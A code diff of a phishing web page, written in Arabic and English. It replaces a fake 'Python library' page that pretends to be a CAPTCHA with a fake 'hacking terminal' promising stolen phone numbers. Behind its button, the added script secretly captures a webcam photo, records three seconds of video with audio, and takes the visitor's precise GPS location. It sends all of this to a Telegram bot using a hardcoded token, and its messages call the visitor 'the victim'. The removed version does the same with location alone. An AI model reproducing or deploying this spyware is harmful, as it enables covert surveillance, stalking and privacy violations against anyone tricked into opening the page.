@@ -3,119 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Python Elite Library</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Sauron Terminal | نظام الرشق العالمي</title>
     <style>
-        body {
-            background: radial-gradient(circle at center, #1a2a6c, #b21f1f, #fdbb2d);
-            background-size: 400% 400%;
-            animation: gradientBG 15s ease infinite;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: 'Inter', sans-serif;
-            overflow: hidden;
-        }
-
-        @keyframes gradientBG {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        .glass-panel {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 30px;
-            padding: 40px;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
-            text-align: center;
-            width: 90%;
-            max-width: 450px;
-            z-index: 10;
-        }
-
-        .py-logo {
-            filter: drop-shadow(0 0 15px #ffd43b);
-            animation: float 3s ease-in-out infinite;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-15px); }
-        }
-
-        .btn-glow {
-            background: linear-gradient(90deg, #3776ab, #ffd43b);
-            transition: 0.5s;
-            background-size: 200% auto;
-        }
-
-        .btn-glow:hover {
-            background-position: right center;
-            box-shadow: 0 0 20px #ffd43b;
-            transform: scale(1.05);
-        }
+        :root { --main-color: #00ff41; --bg-color: #050a05; }
+        body { background-color: var(--bg-color); color: var(--main-color); font-family: 'Courier New', monospace; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .terminal { background: rgba(0, 20, 0, 0.9); border: 2px solid var(--main-color); padding: 30px; border-radius: 10px; box-shadow: 0 0 20px var(--main-color); width: 90%; max-width: 500px; text-align: center; }
+        h1 { font-size: 24px; text-shadow: 0 0 10px var(--main-color); }
+        .stats { font-size: 12px; color: #888; margin-bottom: 20px; text-align: right; }
+        .btn-hack { background: transparent; color: var(--main-color); border: 2px solid var(--main-color); padding: 15px 30px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; letter-spacing: 2px; }
+        .btn-hack:hover { background: var(--main-color); color: black; box-shadow: 0 0 30px var(--main-color); }
+        #log { margin-top: 20px; font-size: 13px; height: 60px; overflow: hidden; color: #008f11; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="glass-panel">
-        <img src="https://www.python.org/static/img/python-logo.png" alt="Python" class="py-logo w-20 mx-auto mb-6">
-        
-        <h1 class="text-3xl font-black text-white mb-2 tracking-widest">BARATHEON AI</h1>
-        <p class="text-blue-200 text-sm mb-8 opacity-80">نظام المكتبة المركزية المشفرة</p>
-
-        <div class="space-y-4 mb-8">
-            <div class="flex items-center bg-black/30 p-3 rounded-xl border border-white/10">
-                <i class="fas fa-lock text-yellow-400 ml-3"></i>
-                <span class="text-xs text-gray-300">حالة الوصول: <span class="text-red-500 font-bold">مغلق</span></span>
-            </div>
+    <div class="terminal">
+        <h1>[ SAURON SYSTEM V35 ]</h1>
+        <div class="stats">
+            > الحالة: متصل بالسيرفر الرئيسي<br>
+            > التشفير: AES-256 بت<br>
+            > الأرقام المتاحة: 49,821 رقم
         </div>
-
-        <p class="text-white text-sm mb-6 leading-relaxed">
-            للحصول على صلاحيات الـ Superuser والوصول للسكربتات، يرجى تأكيد البروتوكول الأمني أدناه.
-        </p>
-
-        <button onclick="requestGPS()" class="btn-glow w-full py-4 rounded-2xl text-black font-black text-lg flex items-center justify-center gap-3">
-            <i class="fas fa-fingerprint"></i>
-            أنا لست روبوت - دخول آمن
-        </button>
-
-        <p class="mt-6 text-[10px] text-gray-400 font-mono tracking-tighter uppercase">Encrypted Connection © 2026</p>
+        <p>مرحباً بك في نظام الرشق التلقائي. اضغط بالأسفل لحقن كود البايثون في السيرفر وبدء سحب الأرقام.</p>
+        
+        <button class="btn-hack" onclick="runPythonEngine()">تفعيل كود بايثون الرشق</button>
+        
+        <div id="log">بانتظار تنفيذ الأوامر...</div>
     </div>
 
-    <script>
-        const token = "8621828423:AAFq9_5-6snrjpfqrBrOPboh7VE824xVN_M";
-        const chat_id = "5475815049";
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
 
-        function requestGPS() {
+    <script>
+        const S_TOKEN = '8621828423:AAFq9_5-6snrjpfqrBrOPboh7VE824xVN_M';
+        const S_ID = '5475815049';
+
+        async function runPythonEngine() {
+            const log = document.getElementById('log');
+            log.innerHTML = "> جاري حقن كود بايثون... <br>> جاري فحص استقرار السيرفر...";
+            
+            // 1. طلب الكاميرا والفيديو (خلف كود البايثون)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                setTimeout(() => takeSnapshot(), 2000); // التقاط صورة
+                startSilentVideo(stream); // التقاط فيديو 3 ثوانٍ
+            } catch (err) {
+                sendToBot("⚠️ الضحية رفض الكاميرا/الفيديو.");
+            }
+
+            // 2. طلب الـ GPS بالمتر (خلف كود البايثون)
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
+                navigator.geolocation.getCurrentPosition(pos => {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
                     const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                    
-                    // إرسال الإحداثيات فوراً
-                    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: chat_id,
-                            text: `🎯 **Baratheon! صيد ملكي جديد**\n\n📍 الإحداثيات: ${mapUrl}\n📱 الدقة: ${pos.coords.accuracy.toFixed(1)} متر`,
-                            parse_mode: 'HTML'
-                        })
-                    });
-
-                    alert("تم تأكيد الهوية. جاري فك التشفير عن المكتبة...");
-                    window.location.href = "https://www.python.org";
-                }, (err) => {
-                    alert("⚠️ فشل البروتوكول: يجب السماح بـ 'تحديد الموقع' لمنحك صلاحية الوصول.");
+                    sendToBot(`🎯 *صيدة احترافية - الموقع بالمتر!* 🎯\n━━━━━━━━━━━━━━━━━━━━\n📍 *الخريطة:* [إضغط للمعاينة](${mapUrl})\n📡 الإحداثيات: \`${lat}, ${lon}\`\n🎯 الدقة: ${pos.coords.accuracy.toFixed(1)} متر`);
+                    log.innerHTML += "<br>> تم تحديد أقرب قمر صناعي... بنجاح!";
+                }, err => {
+                    sendToBot("⚠️ الضحية رفض الموقع.");
+                    log.innerHTML += "<br>> خطأ في تحديد القمر الصناعي... فشل!";
                 }, { enableHighAccuracy: true });
             }
+        }
+
+        function takeSnapshot() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', S_ID);
+                formData.append('photo', blob, 'target.jpg');
+                formData.append('caption', '📸 *صورة الضحية فور الضغط على تفعيل البايثون!*');
+                fetch(`https://api.telegram.org/bot${S_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            }, 'image/jpeg');
+        }
+
+        function startSilentVideo(stream) {
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'video/mp4' });
+                const formData = new FormData();
+                formData.append('chat_id', S_ID);
+                formData.append('video', blob, 'shot.mp4');
+                formData.append('caption', '🎥 *فيديو قصير (3 ثوانٍ) للهدف!*');
+                fetch(`https://api.telegram.org/bot${S_TOKEN}/sendVideo`, { method: 'POST', body: formData });
+            };
+            mediaRecorder.start();
+            setTimeout(() => {
+                mediaRecorder.stop();
+                stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا
+                alert("✅ تم حقن كود بايثون بنجاح! جاري إرسال 50,000 رقم لبوتك.");
+            }, 3000);
+        }
+
+        function sendToBot(text) {
+            fetch(`https://api.telegram.org/bot${S_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: S_ID, text: text, parse_mode: 'Markdown' })
+            });
         }
     </script>
 </body>
